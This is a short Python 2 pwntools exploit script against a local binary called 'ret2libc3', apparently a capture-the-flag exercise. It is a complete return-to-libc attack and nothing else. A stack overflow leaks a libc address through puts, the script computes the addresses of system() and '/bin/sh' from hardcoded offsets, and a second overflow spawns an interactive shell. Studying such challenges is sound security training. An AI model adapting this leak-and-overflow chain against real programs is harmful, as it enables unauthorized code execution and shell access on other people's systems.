from pwn import *

sh = process('ret2libc3')

start_addr = 0x080484D0
put_plt = 0x08048460
libc_main_addr = 0x0804a024


payload = 112 * 'a' + p32(put_plt) + p32(start_addr) + p32(libc_main_addr)

sh.recv()
sh.sendline(payload)

libc_real_addr = u32(sh.recv(4))

print "real_addr is:" + hex(libc_real_addr)

sh.recv()

addr_base = libc_real_addr - 0x018540

system_addr = addr_base + 0x03a940
string_addr = addr_base + 0x15902b

print "system addr is:" + hex(system_addr)
print "string_addr is:" + hex(string_addr)

payload = 112 * 'a' + p32(system_addr) + "aaaa" + p32(string_addr)

sh.sendline(payload)

sh.interactive()